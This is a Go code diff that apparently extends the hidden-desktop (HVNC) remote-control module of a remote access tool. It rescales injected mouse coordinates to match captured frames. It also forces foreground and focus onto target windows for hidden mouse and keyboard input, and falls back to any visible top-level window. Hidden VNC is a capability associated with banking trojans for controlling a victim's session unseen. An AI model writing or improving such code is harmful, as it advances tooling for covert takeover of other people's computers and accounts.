@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"image"
 	"log"
+	"math"
 	"runtime"
 	"strings"
 	"sync"
@@ -170,6 +171,7 @@ var (
 	hvncCurrentTaskID   atomic.Uint64
 	hvncCurrentTaskKind atomic.Int64
 	hvncCurrentTaskNs   atomic.Int64
+	hvncLastScale       atomic.Uint64 // float64 bits — scale used by last HVNC capture
 
 	// Capture cache: pooled DC/DIB per window to avoid per-frame allocation
 	hvncWinCache     map[uintptr]*hvncWinCacheEntry
@@ -385,6 +387,7 @@ func CleanupHVNCDesktop() {
 	hvncHasCursor = false
 	hvncWorkingWindow = 0
 	hvncInputMu.Unlock()
+	hvncLastScale.Store(0)
 
 	if hvncDesktopHandle != 0 {
 		if hvncOriginalDesktop != 0 {
@@ -731,6 +734,7 @@ func hvncCaptureDisplayOnThread(display int) (*image.RGBA, error) {
 	}
 
 	userScale := effectiveScale(srcW, srcH)
+	hvncLastScale.Store(math.Float64bits(userScale))
 	dstW := int(float64(srcW) * userScale)
 	dstH := int(float64(srcH) * userScale)
 	if dstW <= 0 || dstH <= 0 {
@@ -930,6 +934,13 @@ func hvncMouseMoveOnThread(display int, x, y int32) error {
 		return nil
 	}
 
+	if bits := hvncLastScale.Load(); bits != 0 {
+		if s := math.Float64frombits(bits); s > 0 && s < 1 {
+			x = int32(float64(x) / s)
+			y = int32(float64(y) / s)
+		}
+	}
+
 	absX := bounds.Min.X + int(x)
 	absY := bounds.Min.Y + int(y)
 	if absX < bounds.Min.X {
@@ -954,7 +965,14 @@ func hvncMouseMoveOnThread(display int, x, y int32) error {
 	pt := point{x: int32(absX), y: int32(absY)}
 	hitHwnd := windowFromPoint(pt)
 	if hitHwnd != 0 {
+		root := rootWindow(hitHwnd)
+		prevWorking := getWorkingWindow()
 		rememberWorkingWindow(hitHwnd)
+		if prevWorking == 0 || rootWindow(prevWorking) != root {
+			procSetForegroundWindow.Call(root)
+			procSetActiveWindow.Call(root)
+			procSetFocus.Call(hitHwnd)
+		}
 		clientPt := pt
 		procScreenToClient.Call(hitHwnd, uintptr(unsafe.Pointer(&clientPt)))
 		postMouseMessage(hitHwnd, WM_MOUSEMOVE, uintptr(currentMouseButtons()), clientPt)
@@ -969,12 +987,22 @@ func hvncMouseButtonOnThread(button int, down bool) error {
 		endHVNCWindowDrag(pt)
 	}
 
+	setMouseButton(button, down)
+
 	hitHwnd := windowFromPoint(pt)
 	if hitHwnd == 0 {
 		return nil
 	}
 
+	root := rootWindow(hitHwnd)
+	prevWorking := getWorkingWindow()
 	rememberWorkingWindow(hitHwnd)
+
+	if down && (prevWorking == 0 || rootWindow(prevWorking) != root) {
+		procSetForegroundWindow.Call(root)
+		procSetActiveWindow.Call(root)
+		procSetFocus.Call(hitHwnd)
+	}
 
 	if button == 0 {
 		lparam := makeLParam(pt.x, pt.y)
@@ -1066,9 +1094,19 @@ func hvncKeyOnThread(vk uint16, down bool) error {
 		hwnd = getWorkingWindow()
 	}
 	if hwnd == 0 {
+		hwnd = findAnyVisibleTopLevelWindow()
+	}
+	if hwnd == 0 {
 		return nil
 	}
-	rememberWorkingWindow(rootWindow(hwnd))
+	root := rootWindow(hwnd)
+	prevWorking := getWorkingWindow()
+	rememberWorkingWindow(root)
+	if prevWorking == 0 || rootWindow(prevWorking) != root {
+		procSetForegroundWindow.Call(root)
+		procSetActiveWindow.Call(root)
+		procSetFocus.Call(hwnd)
+	}
 	updateModifierState(vk, down)
 
 	if isModifierVK(vk) {
@@ -1092,6 +1130,17 @@ func hvncKeyOnThread(vk uint16, down bool) error {
 func foregroundWindow() uintptr {
 	r, _, _ := procGetForegroundWindow.Call()
 	return r
+}
+
+func findAnyVisibleTopLevelWindow() uintptr {
+	hwnd := getTopWindow(0)
+	for hwnd != 0 {
+		if isWindowVisible(hwnd) {
+			return hwnd
+		}
+		hwnd = getWindow(hwnd, GW_HWNDNEXT)
+	}
+	return 0
 }
 
 func makeLParam(x, y int32) uintptr {
